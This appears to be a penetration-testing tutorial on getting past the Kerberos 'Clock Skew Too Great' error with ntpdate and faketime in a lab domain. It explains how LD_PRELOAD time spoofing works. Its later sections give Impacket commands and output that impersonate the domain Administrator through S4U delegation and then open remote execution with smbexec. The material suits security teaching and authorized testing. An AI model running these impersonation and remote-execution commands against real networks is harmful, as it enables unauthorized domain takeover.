### Bypassing Kerberos Time Verification: Clock Skew Too Great

**Kerberos** is a network authentication protocol that uses encrypted tickets to verify identities in distributed systems. One of its fundamental security measures is **strict time synchronization** between clients and servers.

```ruby
Kerberos(Clock Skew Too Great)
```

This error occurs when there's a time difference greater than **5 minutes** (by default) between the local clock and the Domain Controller (DC). This protection prevents replay attacks where an attacker might attempt to reuse old tickets. In compromised environments or during penetration testing, this mechanism can block valid TGT (Ticket Granting Ticket) acquisition, preventing access to resources.

> **Time to perform a deep analysis to fix this error.**

-----

### 1. Using ntpdate

The **ntpdate** command is a utility for setting and synchronizing the date and time of a computer system to match that of a reliable NTP (Network Time Protocol) server. By ensuring the system clock is accurate, ntpdate helps maintain system logs, schedule tasks, and ensure time-sensitive operations run effectively.

* **Why it fails:** Some distributions may not have ntpdate installed or the timesync service available.
* **How to check:**

```bash
sudo systemctl status systemd-timesyncd
# Result: Unit systemd-timesyncd.service could not be found.
```

#### Basic ntpdate Usage

```bash
ntpdate coloso.local
# Result: 2025-05-06 15:12:02.237340 (-0700) +3181.036456 +/- 0.059572 coloso.local 10.10.11.51 s1 no-leap
#         CLOCK: step_systime: Operation not permitted
```

* **Why synchronization matters:** Crucial for maintaining sync across clusters, databases, and logging services.
* **Potential issues:** Systems operating on different times can cause data corruption or erroneous log entries.

#### Advanced ntpdate Options

```bash
# Force immediate time adjustment (not gradual)
ntpdate -b coloso.local
```

* **When to use:** When avoiding gradual time slewing.
* **Impact:** Uses `settimeofday` instead of gradual adjustment.

#### Multiple Synchronization Attempts

When internet speed affects synchronization attempts against a Domain Controller, multiple attempts can help:

```bash
for x in $(seq 1 10); do sudo ntpdate coloso.local; done
```

* **Why it's useful:** Increases success rate in unstable network conditions.
* **Automation:** Simple bash loop for repeated attempts.

-----

### 2. Using faketime

The **faketime** tool intercepts system time-related calls, allowing applications to be "fooled" about the current time. This can bypass Kerberos time verification in Impacket tools against Windows Domain Controllers.

#### How It Works

1. **Obtain DC Time via SMB:** First get the exact time from the Domain Controller using SMB (which doesn't have Kerberos time restrictions).
2. **Use faketime with Obtained Time:** Generate a TGT synchronized with DC time.

#### Windows Time Commands Reference

| Command | Description |
| :--- | :--- |
| `date /t` | Displays only the current date |
| `time /t` | Displays only the current time |
| `date` | Displays and allows date modification |
| `Get-Date` | Displays full date and time (PowerShell) |
| `Get-Date -Format "dd/MM/yyyy"` | Custom output date |
| `Get-Date -Format "HH:mm:ss"` | Hour in 24h format |
| `(Get-Date).DayOfWeek` | Day of the week |

#### Using faketime

```bash
# Get current time for reference
date
# Result: Tuesday, May 6, 2025 3:07:50 PM

# Basic faketime usage
faketime "2025-05-06 15:07:50"
```

> **Important:** The faketime command must be executed in the same line as the target command, without using pipes or xargs.

#### Obtaining TGT with faketime

```bash
faketime "2025-04-19 21:24:36" impacket-getST -spn 'cifs/coloso.local' -impersonate Administrator -dc-ip 10.10.11.174 'coloso/vishok$:vishok'
# Result:
# [+] Getting TGT for user
# [+] Impersonating Administrator
# [+]     Requesting S4U2self
# [+]     Requesting S4U2proxy
# [+] Saving ticket in Administrator.ccache
```

* **Command structure:** `faketime "timestamp" command-to-execute`
* **Output:** Generates `.ccache` file with valid Kerberos ticket
* **Note:** The second command won't have syntax highlighting - this is normal

-----

### Technical Deep Dive: faketime Mechanics

**faketime** operates by intercepting system calls related to time through `LD_PRELOAD`, a Linux mechanism that loads libraries before others. The `LD_PRELOAD` variable specifies paths to libraries which are loaded before any other libraries.

#### Key Mechanism

When applications like **impacket-getST** make system calls to check the current time (such as `time()`, `gettimeofday()`, or `clock_gettime()`), these calls are redirected to libfaketime instead of the standard C library.

#### Precedence Principle

Symbols (e.g., functions) contained in preloaded libraries take precedence over symbols from libraries loaded afterwards, allowing faketime to override time-related functions.

![faketime interception mechanism](/machines/public/clockskew/2.png)

-----

### Final Configuration and Usage

To use the generated ticket, export it as an environment variable:

```bash
# Check current time for reference
date
# Result: Tuesday, May 6, 2025 3:07:50 PM

# Export ticket and execute with faketime
KRB5CCNAME=Administrator.ccache faketime "2025-04-19 21:30:08" impacket-smbexec -dc-ip 10.10.11.174 -no-pass -k coloso/administrator@coloso.local
```

#### Important Notes

* **Consistent faketime usage:** Always use faketime with the DC-synchronized time
* **Environment variable:** `KRB5CCNAME` tells Impacket tools where to find Kerberos credentials
* **No password required:** The `-no-pass` flag works because authentication uses the ticket cache

#### Complete Workflow

1. **Obtain DC time** via SMB or other non-Kerberos method
2. **Generate TGT** using faketime with the DC time
3. **Export ticket** to environment variable
4. **Execute target commands** with faketime and ticket reference

-----

### Quick Reference Table

| Tool | Purpose | Key Command |
| :--- | :--- | :--- |
| **ntpdate** | System time synchronization | `ntpdate -b dc.domain.local` |
| **faketime** | Time spoofing for applications | `faketime "YYYY-MM-DD HH:MM:SS" command` |
| **Impacket** | Kerberos ticket operations | `impacket-getST -spn 'service/DC' ...` |
| **KRB5CCNAME** | Ticket cache environment variable | `export KRB5CCNAME=ticket.ccache` |

-----

### Security Considerations

* **Legitimate use:** These techniques are valid for penetration testing and security assessments
* **Authorization required:** Only use on systems you own or have permission to test
* **Detection:** Some security systems may detect time manipulation attempts
* **Alternative approaches:** Consider fixing actual time synchronization issues for long-term solutions

-----

**Made with love by VIsh0k**